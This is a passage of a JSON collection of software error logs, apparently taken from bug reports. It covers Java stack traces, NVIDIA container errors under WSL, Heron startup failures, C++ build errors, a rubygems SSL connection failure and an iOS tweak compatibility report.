init$2$$anonfun$apply$52.apply(S.scala:1790)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2.apply(S.scala:1789)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_init(S.scala:1788)\r\n\tnet.liftweb.http.S$class.init(S.scala:1376)\r\n\tnet.liftweb.http.S$.init(S.scala:47)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$.doSession$1(LiftServlet.scala:384)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$.process(LiftServlet.scala:394)\r\n\tnet.liftweb.http.LiftServlet.stepThroughPipeline$1(LiftServlet.scala:428)\r\n\tnet.liftweb.http.LiftServlet.doService(LiftServlet.scala:436)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$doIt$1$2.apply(LiftServlet.scala:157)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$doIt$1$2.apply(LiftServlet.scala:156)\r\n\tnet.liftweb.util.TimeHelpers$class.calcTime(TimeHelpers.scala:427)\r\n\tnet.liftweb.util.Helpers$.calcTime(Helpers.scala:34)\r\n\tnet.liftweb.util.TimeHelpers$class.logTime(TimeHelpers.scala:446)\r\n[Truncated]\n\tnet.liftweb.http.provider.servlet.ServletFilterProvider$class.doFilter(ServletFilterProvider.scala:74)\r\n\tnet.liftweb.http.LiftFilter.doFilter(LiftServlet.scala:1064)\r\n\torg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\r\n\torg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\r\n\torg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:219)\r\n\torg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:110)\r\n\torg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:494)\r\n\torg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\r\n\torg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:104)\r\n\torg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:1025)\r\n\torg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\r\n\torg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:445)\r\n\torg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1137)\r\n\torg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)\r\n\torg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:318)\r\n\tjava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tjava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\torg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\n\tjava.lang.Thread.run(Thread.java:748)"
    },
    {
        "logs": "0912:00:00.0 3D controller: Microsoft Corporation Device 008e\r\n        Physical Slot: 205491325\r\n        Flags: bus master, fast devsel, latency 0\r\n        Capabilities: <access denied>\r\nlspci: Unable to load libkmod resources: error -12"
    },
    {
        "logs": "I0601 16:20:35.910910 10496 nvc.c:372] initializing library context (version=1.4.0, build=704a698b7a0ceec07a48e56c37365c741718c2df)\r\nI0601 16:20:35.910937 10496 nvc.c:346] using root /\r\nI0601 16:20:35.910940 10496 nvc.c:347] using ldcache /etc/ld.so.cache\r\nI0601 16:20:35.910943 10496 nvc.c:348] using unprivileged user 1000:1000\r\nI0601 16:20:35.910952 10496 nvc.c:389] attempting to load dxcore to see if we are running under Windows Subsystem for Linux (WSL)\r\nI0601 16:20:35.926374 10496 dxcore.c:226] Creating a new WDDM Adapter for hAdapter:40000000 luid:25bed4\r\nI0601 16:20:35.936709 10496 dxcore.c:267] Adding new adapter via dxcore hAdapter:40000000 luid:25bed4 wddm version:3000\r\nI0601 16:20:35.936741 10496 dxcore.c:325] dxcore layer initialized successfully\r\nW0601 16:20:35.937182 10496 nvc.c:397] skipping kernel modules load on WSL\r\nI0601 16:20:35.937357 10497 driver.c:101] starting driver service\r\nE0601 16:20:35.945577 10497 driver.c:168] could not start driver service: load library failed: /usr/lib/wsl/drivers/nv_dispi.inf_amd64_43efafcd74b2efc9/libnvidia-ml.so.1: undefined symbol: devicesetgpcclkvfoffset\r\nI0601 16:20:35.945724 10496 driver.c:203] driver service terminated successfully\r\nnvidia-container-cli: initialization error: driver error: failed to process request"
    },
    {
        "logs": "version: 1.4.0\r\nbuild date: 2021-04-24T14:25+00:00\r\nbuild revision: 704a698b7a0ceec07a48e56c37365c741718c2df\r\nbuild compiler: x86_64-linux-gnu-gcc-7 7.5.0\r\nbuild platform: x86_64\r\nbuild flags: -D_GNU_SOURCE -D_FORTIFY_SOURCE=2 -DNDEBUG -std=gnu11 -O2 -g -fdata-sections -ffunction-sections -fstack-protector -fno-strict-aliasing -fvisibility=hidden -Wall -Wextra -Wcast-align -Wpointer-arith -Wmissing-prototypes -Wnonnull -Wwrite-strings -Wlogical-op -Wformat=2 -Wmissing-format-attribute -Winit-self -Wshadow -Wstrict-prototypes -Wunreachable-code -Wconversion -Wsign-conversion -Wno-unknown-warning-option -Wno-format-extra-args -Wno-gnu-alignof-expression -Wl,-zrelro -Wl,-znow -Wl,-zdefs -Wl,--gc-sections"
    },
    {
        "logs": "docker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: process_linux.go:545: container init caused: Running hook #0:: error running hook: exit status 1, stdout: , stderr: nvidia-container-cli: initialization error: driver error: failed to process request: unknown.\r\nERRO[0000] error waiting for container: context canceled"
    },
    {
        "logs": "[2016-05-31 14:52:14 +0530] com.twitter.heron.common.network.HeronClient SEVERE:  Failed to FinishConnect to endpoint: /127.0.0.1:50171 \r\njava.net.ConnectException: Connection refused\r\n\tat sun.nio.ch.SocketChannelImpl.checkConnect(Native Method)\r\n\tat sun.nio.ch.SocketChannelImpl.finishConnect(SocketChannelImpl.java:740)\r\n\tat com.twitter.heron.common.network.HeronClient.handleConnect(HeronClient.java:244)\r\n\tat com.twitter.heron.common.basics.NIOLooper.handleSelectedKeys(NIOLooper.java:115)\r\n\tat com.twitter.heron.common.basics.NIOLooper.access$000(NIOLooper.java:32)\r\n\tat com.twitter.heron.common.basics.NIOLooper$1.run(NIOLooper.java:45)\r\n\tat com.twitter.heron.common.basics.WakeableLooper.executeTasksOnWakeup(WakeableLooper.java:142)\r\n\tat com.twitter.heron.common.basics.WakeableLooper.runOnce(WakeableLooper.java:74)\r\n\tat com.twitter.heron.common.basics.WakeableLooper.loop(WakeableLooper.java:64)\r\n\tat com.twitter.heron.instance.Gateway.run(Gateway.java:155)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)\r\n\tat java.lang.Thread.run(Thread.java:745)"
    },
    {
        "logs": "File \"heron-executor.stdout\" reports the following error - \r\n2016-05-31 17:36:57: Running container_1_word_2 process as /usr/lib/jvm/default-java/bin/java -Xmx320M -Xms320M -Xmn160M -XX:MaxPermSize=128M -XX:PermSize=128M -XX:ReservedCodeCacheSize=64M -XX:+CMSScavengeBeforeRemark -XX:TargetSurvivorRatio=90 -XX:+PrintCommandLineFlags -verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintGCCause -XX:+PrintPromotionFailure -XX:+PrintTenuringDistribution -XX:+PrintHeapAtGC -XX:+HeapDumpOnOutOfMemoryError -XX:+UseConcMarkSweepGC -XX:ParallelGCThreads=4 -Xloggc:log-files/gc.container_1_word_2.log -XX:+HeapDumpOnOutOfMemoryError -Djava.net.preferIPv4Stack=true -cp ./heron-core/lib/instance/*:heron-examples.jar com.twitter.heron.instance.HeronInstance ExclamationTopology ExclamationTopology4dd1e087-a0cf-4ea5-9e87-4217c412c646 container_1_word_2 word 2 0 stmgr-1 58491 50621 ./heron-conf/heron_internals.yaml"
    },
    {
        "logs": "2016-05-31 17:36:57: Running container_1_exclaim1_1 process as /usr/lib/jvm/default-java/bin/java -Xmx320M -Xms320M -Xmn160M -XX:MaxPermSize=128M -XX:PermSize=128M -XX:ReservedCodeCacheSize=64M -XX:+CMSScavengeBeforeRemark -XX:TargetSurvivorRatio=90 -XX:+PrintCommandLineFlags -verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintGCCause -XX:+PrintPromotionFailure -XX:+PrintTenuringDistribution -XX:+PrintHeapAtGC -XX:+HeapDumpOnOutOfMemoryError -XX:+UseConcMarkSweepGC -XX:ParallelGCThreads=4 -Xloggc:log-files/gc.container_1_exclaim1_1.log -XX:+HeapDumpOnOutOfMemoryError -Djava.net.preferIPv4Stack=true -cp ./heron-core/lib/instance/*:heron-examples.jar com.twitter.heron.instance.HeronInstance ExclamationTopology ExclamationTopology4dd1e087-a0cf-4ea5-9e87-4217c412c646 container_1_exclaim1_1 exclaim1 1 0 stmgr-1 58491 50621 ./heron-conf/heron_internals.yaml"
    },
    {
        "logs": "./heron-core/bin/heron-stmgr: error while loading shared libraries: libunwind.so.8: cannot open shared object file: No such file or directory"
    },
    {
        "logs": "It is also possible that the host has an issue with resolving localhost. To check, run the following command in a shell.\r\n\r\n$ python -c \"import socket; print socket.gethostbyname(socket.gethostname())\"\r\nTraceback (most recent call last):\r\n  File \"<string>\", line 1, in <module>\r\nsocket.gaierror: [Errno 8] nodename nor servname provided, or not known\r\nIf the output looks like a normal IP address, such as 127.0.0.1, you don't have this issue. If the output is similar to the above, you need to modify the /etc/hosts file to correctly resolve localhost, as shown below.\r\n\r\nRun the following command, whose output is your computer's hostname.\r\n\r\n$ python -c \"import socket; print socket.gethostname()\"\r\nOpen the /etc/hosts file as superuser and find a line containing\r\n\r\n127.0.0.1   localhost\r\nAppend your hostname after the word \"localhost\" on the line. For example, if your hostname was tw-heron, then the line should look like the following:\r\n\r\n127.0.0.1   localhost   tw-heron\r\nSave the file. The change should usually be reflected immediately, although rebooting might be necessary depending on your platform."
    },
    {
        "logs": "Installing collected packages: ConfigArgParse, click, MarkupSafe, Jinja2, Werkzeug, itsdangerous, Flask, termcolor, pyparsing, packaging, deprecation, iso8601, pbr, stevedore, keystoneauth1, os-service-types, munch, netifaces, futures, appdirs, requestsexceptions, jmespath, jsonpointer, jsonpatch, dogpile.cache, openstacksdk, bcrypt, asn1crypto, cryptography, pynacl, paramiko, spur, python-dateutil, pyasn1-modules, rsa, httplib2, oauth2client, kubernetes, powerfulseal"
    },
    {
        "logs": "Successfully installed ConfigArgParse-0.13.0 Flask-0.12.2 Jinja2-2.10 MarkupSafe-1.0 Werkzeug-0.14.1 appdirs-1.4.3 asn1crypto-0.24.0 bcrypt-3.1.4 click-6.7 cryptography-2.2.2 deprecation-2.0.2 dogpile.cache-0.6.5 futures-3.2.0 httplib2-0.11.3 iso8601-0.1.12 itsdangerous-0.24 jmespath-0.9.3 jsonpatch-1.23 jsonpointer-2.0 keystoneauth1-3.5.0 kubernetes-1.0.2 munch-2.3.1 netifaces-0.10.6 oauth2client-4.1.2 openstacksdk-0.12.0 os-service-types-1.2.0 packaging-17.1 paramiko-2.4.1 pbr-4.0.2 powerfulseal-1.1.1 pyasn1-modules-0.2.1 pynacl-1.2.1 pyparsing-2.2.0 python-dateutil-2.7.2 requestsexceptions-1.4.0 rsa-3.4.2 spur-0.3.20 stevedore-1.28.0 termcolor-1.1.0"
    },
    {
        "logs": "[ 50%] Building CXX object src/Bindings/CMakeFiles/Bindings.dir/Bindings.cpp.o\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:338:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:351:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:368:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:381:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:398:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:411:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:553:86: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<float>* a_Rhs = ((const Vector3<float>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                     ^\r\n                                                                                     nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:578:86: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<float>* a_Rhs = ((const Vector3<float>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                     ^\r\n                                                                                     nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:604:88: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<double>* a_Rhs = ((const Vector3<double>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                       ^\r\n                                                                                       nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:629:88: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<double>* a_Rhs = ((const Vector3<double>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                       ^\r\n                                                                                       nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:655:82: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* a_Rhs = ((const Vector3<int>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                 ^\r\n                                                                                 nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:680:82: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* a_Rhs = ((const Vector3<int>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                 ^\r\n                                                                                 nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:710:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:744:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:775:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:817:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:849:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:881:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:914:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\nfatal error: too many errors emitted, stopping now [-ferror-limit=]\r\n20 errors generated.\r\nmake[2]: *** [src/Bindings/CMakeFiles/Bindings.dir/Bindings.cpp.o] Error 1\r\nmake[1]: *** [src/Bindings/CMakeFiles/Bindings.dir/all] Error 2\r\nmake: *** [all] Error 2"
    },
    {
        "logs": "[ 50%] Building CXX object src/Bindings/CMakeFiles/Bindings.dir/Bindings.cpp.o\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:338:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:351:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:368:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:381:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:398:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:411:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:553:86: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<float>* a_Rhs = ((const Vector3<float>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                     ^\r\n                                                                                     nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:578:86: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<float>* a_Rhs = ((const Vector3<float>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                     ^\r\n                                                                                     nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:604:88: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<double>* a_Rhs = ((const Vector3<double>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                       ^\r\n                                                                                       nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:629:88: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<double>* a_Rhs = ((const Vector3<double>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                       ^\r\n                                                                                       nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:655:82: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* a_Rhs = ((const Vector3<int>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                 ^\r\n                                                                                 nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:680:82: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* a_Rhs = ((const Vector3<int>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                 ^\r\n                                                                                 nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:710:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:744:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:775:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:817:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:849:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:881:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:914:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\nfatal error: too many errors emitted, stopping now [-ferror-limit=]\r\n20 errors generated.\r\nmake[2]: *** [src/Bindings/CMakeFiles/Bindings.dir/Bindings.cpp.o] Error 1\r\nmake[1]: *** [src/Bindings/CMakeFiles/Bindings.dir/all] Error 2\r\nmake: *** [all] Error 2"
    },
    {
        "logs": "Here's your Ruby and OpenSSL environment:\r\n\r\nRuby:           2.4.4p296 (2018-03-28 revision 63013) [x64-mingw32]\r\nRubyGems:       2.7.6\r\nBundler:        1.16.1\r\nCompiled with:  OpenSSL 1.0.2o  27 Mar 2018\r\nLoaded version: OpenSSL 1.0.2o  27 Mar 2018\r\nSSL_CERT_FILE:  C:/Ruby24-x64/ssl/cert.pem\r\nSSL_CERT_DIR:   C:/Ruby24-x64/ssl/certs\r\n\r\nWith that out of the way, let's see if you can connect to rubygems.org...\r\n\r\nBundler connection to rubygems.org:       failed  \u274c  (An existing connection was forcibly closed by the remote host. - SSL_connect)\r\nRubyGems connection to rubygems.org:      failed  \u274c  (Errno::ECONNRESET: An existing connection was forcibly closed by the remote host. - SSL_connect (https://rubygems.org))\r\nRuby net/http connection to rubygems.org: failed  \u274c\r\n\r\nUnfortunately, this Ruby can't connect to rubygems.org. \ud83d\ude21\r\nEven worse, we're not sure why. \ud83d\ude15\r\n\r\nHere's the full error information:\r\nErrno::ECONNRESET: An existing connection was forcibly closed by the remote host. - SSL_connect\r\n  C:/Ruby24-x64/lib/ruby/2.4.0/net/protocol.rb:44:in "
    },
    {
        "logs": "{\r\n  \"packageId\": \"com.aesthyrica.lafon\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"com.aesthyrica.lafon\",\r\n    \"deviceId\": \"iPhone10,3\",\r\n    \"url\": \"http://cydia.saurik.com/package/com.aesthyrica.lafon/\",\r\n    \"iOSVersion\": \"12.1.1\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"Lafon\",\r\n    \"category\": \"Tweaks\",\r\n    \"repository\": \"Packix\",\r\n    \"name\": \"Lafon\",\r\n    \"installed\": \"1.0\",\r\n    \"packageIndexed\": false,\r\n    \"packageStatusExplaination\": \"This tweak has not been reviewed. Please submit a review if you choose to install.\",\r\n    \"id\": \"com.aesthyrica.lafon\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"Change the Lockscreen fonts.\",\r\n    \"latest\": \"1.0\",\r\n    \"author\": \"Aesthyrica\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJjb20uYWVzdGh5cmljYS5sYWZvbiIsImRldmljZUlkIjoiaVBob25lMTAsMyIsInVybCI6Imh0dHA6XC9cL2N5ZGlhLnNhdXJpay5jb21cL3BhY2thZ2VcL2NvbS5hZXN0aHlyaWNhLmxhZm9uXC8iLCJpT1NWZXJzaW9uIjoiMTIuMS4xIiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJMYWZvbiIsImNhdGVnb3J5IjoiVHdlYWtzIiwicmVwb3NpdG9yeSI6IlBhY2tpeCIsIm5hbWUiOiJMYWZvbiIsImluc3RhbGxlZCI6IjEuMCIsInBhY2thZ2VJbmRleGVkIjpmYWxzZSwicGFja2FnZVN0YXR1c0V4cGxhaW5hdGlvbiI6IlRoaXMgdHdlYWsgaGFzIG5vdCBiZWVuIHJldmlld2VkLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6ImNvbS5hZXN0aHlyaWNhLmxhZm9uIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkNoYW5nZSB0aGUgTG9ja3NjcmVlbiBmb250cy4iLCJsYXRlc3QiOiIxLjAiLCJhdXRob3IiOiJBZXN0aHlyaWNhIiwicGFja2FnZVN0YXR1cyI6IlVua25vd24ifQ==\",\r\n  \"chosenStatus\": \"notworking\",\r\n  \"notes\": \"Add support for jellyfish tweak\"\r\n}"
    },
    {
        "logs": "{\r\n  \"packageId\": \"com.aesthyrica.lafon\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"com.aesthyrica.lafon\",\r\n    \"deviceId\": \"iPhone10,3\",\r\n    \"url\": \"http://cydia.saurik.com/package/com.aesthyrica.lafon/\",\r\n    \"iOSVersion\": \"12.1.1\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"Lafon\",\r\n    \"category\": \"Tweaks\",\r\n    \"repository\": \"Packix\",\r\n    \"name\": \"Lafon\",\r\n    \"installed\": \"1.0\",\r\n    \"packageIndexed\": false,\r\n    \"packageStatusExplaination\": \"This tweak has not been reviewed. Please submit a review if you choose to install.\",\r\n    \"id\": \"com.aesthyrica.lafon\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"Change the Lockscreen fonts.\",\r\n    \"latest\": \"1.0\",\r\n    \"author\": \"Aesthyrica\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": 